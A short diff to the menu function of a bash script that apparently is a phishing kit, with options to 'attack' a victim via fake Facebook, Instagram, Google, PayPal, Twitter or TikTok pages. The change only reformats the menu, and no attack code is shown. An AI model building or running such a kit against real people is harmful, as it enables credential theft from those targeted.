@@ -716,7 +716,6 @@ main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
-
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook            
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram        
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        
@@ -725,10 +724,8 @@ main_menu() {
 		${RED}[${WHITE}06${RED}]${ORANGE} Paypal                		
 		${RED}[${WHITE}08${RED}]${ORANGE} Twitter                   
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok              
-    
-
-
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}99${RED}]${ORANGE} About         
+		${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
 	EOF
 	
